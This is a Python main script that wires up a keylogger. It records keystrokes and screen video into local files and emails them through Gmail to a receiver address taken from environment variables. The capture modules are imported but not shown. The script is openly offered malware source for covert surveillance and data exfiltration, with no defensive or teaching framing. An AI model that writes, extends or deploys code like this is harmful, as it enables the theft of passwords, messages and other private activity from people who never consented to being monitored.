import os

from dotenv import load_dotenv

from .keylogger import Keylogger, LogHandler
from .messenger import Gmail
from .screen_recorder import ScreenRecorder


if __name__ == "__main__":
    load_dotenv()

    log_file_location = "logs.txt"
    screen_recorder_file_location = "output.avi"

    log_handler = LogHandler(log_file_location=log_file_location, datetime_log_timeout=10)

    keylogger = Keylogger(log_handler=log_handler)

    gmail = Gmail(app_password=os.getenv("APP_PASSWORD"),
                  log_file_location=log_file_location,
                  screen_recorder_file_location=screen_recorder_file_location)
    gmail.sender_address = os.getenv("SENDER_MAIL")
    gmail.receiver_address = os.getenv("RECEIVER_MAIL")

    screen_recorder = ScreenRecorder(video_length=5,
                                     gmail=gmail)

    keylogger.start_listener()
    screen_recorder.start()
